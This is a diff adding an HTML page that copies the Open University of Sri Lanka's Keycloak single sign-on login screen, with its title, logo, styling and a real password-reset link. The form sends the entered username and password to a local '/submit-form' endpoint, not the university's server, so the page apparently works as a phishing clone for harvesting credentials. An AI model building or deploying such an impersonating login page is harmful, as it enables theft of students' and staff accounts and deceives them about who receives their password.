@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html class="login-pf" data-lt-installed="true">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Sign in to OUSL Identity and Access Management System - IAM OUSL SSO</title>
+    <link rel="icon" href="https://iam.ou.ac.lk:8443/resources/lod1v/login/keycloak/img/favicon.ico">
+    <link href="Sign%20in%20to%20OUSL%20Identity%20and%20Access%20Management%20System%20-%20IAM%20OUSL%20SSO_files/patternfly.min_002.css" rel="stylesheet">
+    <link href="Sign%20in%20to%20OUSL%20Identity%20and%20Access%20Management%20System%20-%20IAM%20OUSL%20SSO_files/patternfly.min.css" rel="stylesheet">
+    <link href="Sign%20in%20to%20OUSL%20Identity%20and%20Access%20Management%20System%20-%20IAM%20OUSL%20SSO_files/patternfly-additions.min.css" rel="stylesheet">
+    <link href="Sign%20in%20to%20OUSL%20Identity%20and%20Access%20Management%20System%20-%20IAM%20OUSL%20SSO_files/pficon.css" rel="stylesheet">
+    <link href="Sign%20in%20to%20OUSL%20Identity%20and%20Access%20Management%20System%20-%20IAM%20OUSL%20SSO_files/login.css" rel="stylesheet">
+    <style>
+        .error {
+            color: red;
+            font-size: 1.0em;
+            margin-top: 5px;
+            display: none; /* Hidden initially */
+            letter-spacing: 0.002em;
+        }
+
+        .input-error {
+            border-color: red !important;
+            background-color: #fffcc8;
+            border: none; /* Remove all borders */
+            border-bottom: 2px solid black; /* Add bottom border with desired size and color */
+            outline: none; /* Remove default focus outline */
+        }
+    </style>
+    <script>
+        function validateForm(event) {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const errorMessage = document.getElementById('error-message');
+
+            // Clear previous error styles
+            usernameInput.classList.remove('input-error');
+            passwordInput.classList.remove('input-error');
+            errorMessage.style.display = 'none';
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                event.preventDefault(); // Prevent form submission
+                usernameInput.classList.add('input-error');
+                passwordInput.classList.add('input-error');
+                errorMessage.style.display = 'block'; // Show error message
+                return false;
+            }
+
+            return true;
+        }
+    </script>
+</head>
+
+<body>
+<div class="login-pf-page">
+    <div id="kc-header" class="login-pf-page-header">
+        <div id="kc-header-wrapper">
+            <div class="image">
+                <img src="Sign%20in%20to%20OUSL%20Identity%20and%20Access%20Management%20System%20-%20IAM%20OUSL%20SSO_files/cropped-OUSL-Site-Logo.png" width="400" height="500">
+            </div>
+            <div class="text">
+                <h1>OUSL Identity and Access Management System - IAM OUSL SSO</h1>
+            </div>
+        </div>
+    </div>
+    <div class="card-pf">
+        <header class="login-pf-header">
+            <h1 id="kc-page-title">Sign in to your account</h1>
+        </header>
+        <div id="kc-content">
+            <div id="kc-content-wrapper">
+                <div id="kc-form">
+                    <div id="kc-form-wrapper">
+                        <form id="kc-form-login" onsubmit="validateForm(event)" action="/submit-form" method="POST">
+                            <div class="form-group">
+                                <label for="username" class="pf-c-form__label pf-c-form__label-text">Username or email</label>
+                                <input tabindex="2" id="username" class="pf-c-form-control" name="username" type="text" autofocus="" autocomplete="username">
+                                <h3 id="error-message" class="error">Invalid username or password.</h3>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="password" class="pf-c-form__label pf-c-form__label-text">Password</label>
+                                <div class="pf-c-input-group">
+                                    <input tabindex="3" id="password" class="pf-c-form-control" name="password" type="password" autocomplete="current-password">
+                                    <button class="pf-c-button pf-m-control" type="button" aria-label="Show password" aria-controls="password" data-password-toggle="" tabindex="4" data-label-show="Show password" data-label-hide="Hide password">👁️</button>
+                                </div>
+                            </div>
+
+                            <div class="form-group login-pf-settings">
+                                <div id="kc-form-options"></div>
+                                <div class="">
+                                    <span><a tabindex="6" href="https://iam.ou.ac.lk:8443/realms/ousl_ad_oulms/login-actions/reset-credentials?client_id=oulmsmoodlecid&amp;tab_id=rAGFZ2F-L3s">Forgot Password?</a></span>
+                                </div>
+                            </div>
+
+                            <div id="kc-form-buttons" class="form-group">
+                                <input type="hidden" id="id-hidden-input" name="credentialId">
+                                <input tabindex="7" class="pf-c-button pf-m-primary pf-m-block btn-lg" name="login" id="kc-login" type="submit" value="Sign In">
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // 1. Grab the toggle button and the password input it controls
+      const toggleBtn = document.querySelector('button[data-password-toggle]');
+      const pwdInput  = document.getElementById(toggleBtn.getAttribute('aria-controls'));
+  
+      // 2. On each click, flip the input type and swap button labels/icons
+      toggleBtn.addEventListener('click', function() {
+        const isHidden = pwdInput.type === 'password';
+  
+        // Toggle the actual visibility
+        pwdInput.type = isHidden ? 'text' : 'password';
+  
+        // Swap the aria-label for accessibility
+        toggleBtn.setAttribute(
+          'aria-label',
+          isHidden
+            ? toggleBtn.getAttribute('data-label-hide')   // now showing: “Hide password”
+            : toggleBtn.getAttribute('data-label-show')   // now hiding: “Show password”
+        );
+  
+        // (Optional) If you want to swap the button’s icon/text too:
+        toggleBtn.textContent = isHidden ? '👁️' : '👁️';
+      });
+    });
+  </script>
+  
+</body>
+</html>
+
